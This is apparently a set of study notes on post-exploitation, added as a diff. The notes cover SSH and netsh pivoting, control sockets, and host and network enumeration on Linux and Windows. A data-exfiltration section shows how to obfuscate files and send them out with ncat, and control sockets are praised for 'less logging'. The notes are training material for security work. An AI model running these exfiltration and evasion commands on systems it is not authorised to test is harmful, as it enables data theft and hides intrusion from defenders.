@@ -1,0 +1,193 @@
+Post Exploitation
+
+Pivoting & Redirection
+During the lesson we will review the following topics:
+
+Control Sockets
+Enumeration
+Exfiltration
+
+SSH Overview
+Basic Characteristics
+Access remote systems using an SSH server as a proxy
+Securely transfer files
+Execute commands on a remote system
+VPN using the SSH protocol as a transport
+Forwarding the X Window System display to the client system
+
+Linux Targets
+Local Port Forward
+-L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
+Remote Port Forward
+ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT
+
+
+Windows Targets
+Port Proxying
+netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
+netsh interface portproxy show all
+netsh interface portproxy delete v4tov4 listenport=<LocalPort>
+netsh interface portproxy reset
+
+Control Sockets
+Benefits Provided Include:
+
+Multiplexing
+Data exfiltration
+Less logging
+
+
+
+Control Sockets (config)
+Two main ways to configure:
+
+Command Line Method
+ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
+ssh -S /tmp/s x@x
+scp -o 'ControlPath=/tmp/s' x@x:<Path>
+
+Configuration File Method (~/.ssh/ssh_config)
+HostName *
+ControlPath ~/.ssh/controlmasters/%r@%h:%p
+ControlMaster auto
+ControlPersist 10m
+
+----------------------------------------------------------------------------------------------------------------------------------------
+HOST ENUM:
+
+Linux : 
+last 
+--shows you user that were last logged on 
+
+who 
+shows you who's currently logged on 
+
+whoami -
+shows you who you are logged in as 
+groups -
+shows you the groups of the curent user 
+id - 
+shows you the uid and guid if the current user who's running it 
+
+SERVICE ENUM:
+ps -elf --forest
+ gives you process listing in long  listing forested  format 
+ pstree 
+ 
+ sudo lsof
+  gives you all of the open files and permission you have 
+  
+ ps -p 1 
+  finds linux systemd or sysv
+  
+  
+  systemctl  list-units --type service
+ finds all of the services 
+ 
+ systemctl  list-units --type service | grep running
+ shows you all the running services 
+ 
+ 
+ NET ENUM : 
+ ifconfig -a
+
+ netstat 
+  shows open connections 
+  
+   arp -an 
+   shows you the arp  cache
+   
+ ip route | netstat -r | route 
+ gives you routing table 
+ 
+ cat /proc/cpuinfo
+  gives you the cpu info 
+  
+  lsmod 
+  lists out the kernel modules 
+  
+------------------------------------------------------------------------------------------------------------------------------------------------------
+DATA EXFILTRATION
+
+
+Data Exfiltration
+Session Transcript
+ ssh <user>@<host> | tee
+
+Obfuscation (Windows)
+type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+certutil -encode <file> encoded.b64
+
+Obfuscation (Linux)
+cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+cat <file>> | base64
+
+Encrypted Transport
+scp <source> <destination>
+ncat --ssl <ip> <port> < <file>
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+ENUM 
+WINDOWS:
+ get-localuser
+ get-localuser | select name, description
+ 
+  shows you the local users on the box 
+  
+   get-localgroup 
+    gets all the groups on the box 
+
+get-localuser | get-member 
+ show objects method 
+ 
+ PROCESS ENUM: 
+ tasklist /v 
+ shows you all the running processes 
+ get-process 
+ 
+ get-process | Where-Object {$_.ID -lt '1000'} 
+ gets all proess with id of less than 1000 
+ 
+ 
+  net start 
+  shows you all started services 
+  
+  
+  Get-Service | where-object {$_.status -eq " running" }
+   to find all your running services 
+   
+   wmic service list status --- cmd prompt 
+   
+    ipconfig /all 
+     shows you  the network config 
+     
+   netstat -anob 
+   gives you all the  network connections  and their status 
+   
+  arp -a 
+   gives you the arp cache 
+   
+    route print 
+     gives you the routing table
+      
+   systeminfo
+    gives you  info about the host aswell as OS info , great for verifying info as well as using to find vulnerabilities.
+    
+   
+   
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
